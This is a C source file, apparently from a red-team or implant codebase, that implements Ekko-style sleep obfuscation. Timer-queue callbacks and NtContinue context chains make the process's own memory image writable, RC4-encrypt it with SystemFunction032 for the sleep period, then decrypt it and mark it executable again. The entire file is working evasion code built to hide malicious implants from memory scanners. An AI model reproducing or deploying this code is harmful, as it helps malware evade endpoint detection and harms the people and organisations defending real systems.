#include "SleepObfuscation.h"

// Refrence: Ekko

VOID RC4SleepObfuscation
(
	_In_ DWORD SleepTime
)
{

	CONTEXT ThreadContext		= { 0 };
	CONTEXT ROP[6]				= { 0 };

	HANDLE	TimerHandle			= NULL;
	HANDLE	QueueHandle			= NULL;
	HANDLE	EventHandle			= NULL;

	DWORD	ImageSize			= 0;
	DWORD	OldProtection		= 0;
	DWORD	Time				= 0;

	PVOID	ImageBase			= NULL;
	PVOID	NtContinue			= NULL;
	PVOID	SystemFunction032	= NULL;

	USTRING DataBuf = { 0 };
	USTRING KeyBuf = { 0 };

	CHAR Key[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

	NtContinue = GetProcAddress(GetModuleHandleA("Ntdll"), "NtContinue");
	SystemFunction032 = GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	ImageBase = GetModuleHandle(NULL);
	ImageSize = ((PIMAGE_NT_HEADERS64)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

	KeyBuf.Buffer = Key;
	KeyBuf.Length = KeyBuf.MaximumLength = sizeof(Key);

	DataBuf.Buffer = ImageBase;
	DataBuf.Length = DataBuf.MaximumLength = ImageSize;

	EventHandle = CreateEventW(0, 0, 0, 0);
	QueueHandle = CreateTimerQueue();

	if (CreateTimerQueueTimer(&TimerHandle, QueueHandle, (WAITORTIMERCALLBACK)RtlCaptureContext, &ThreadContext, 0, 0, WT_EXECUTEINTIMERTHREAD))
	{

		WaitForSingleObject(EventHandle, 100);

		for (int i = 0; i < 6; i++)
		{
			RtlCopyMemory(&ROP[i], &ThreadContext, sizeof(CONTEXT));
			ROP[i].Rsp -= sizeof(PVOID);
		}

		EasyRop4(ROP, 0, VirtualProtect, ImageBase, ImageSize, PAGE_READWRITE, &OldProtection);

		INFO("Current Protection: PAGE_READWRITE");

		EasyRop2(ROP, 1, SystemFunction032, &DataBuf, &KeyBuf);

		INFO("Encryption Completed!");

		EasyRop2(ROP, 2, WaitForSingleObject, NtCurrentProcess(), SleepTime);

		INFO("Sleeping for %d seconds", (SleepTime / 1000));

		EasyRop2(ROP, 3, SystemFunction032, &DataBuf, &KeyBuf);

		INFO("Decryption Completed!");

		EasyRop4(ROP, 4, VirtualProtect, ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtection);

		INFO("Current Protection: PAGE_EXECUTE_READWRITE");

		EasyRop1(ROP, 5, SetEvent, EventHandle);

		for (int i = 0; i < 6; i++)
		{
			CreateTimerQueueTimer(&TimerHandle, QueueHandle, NtContinue, &ROP[i], Time += 100, 0, WT_EXECUTEINTIMERTHREAD);
		}

		INFO("Waiting for Event...");

		WaitForSingleObject(EventHandle, INFINITE);

		INFO("Event Done!");

	}

	DeleteTimerQueue(QueueHandle);
}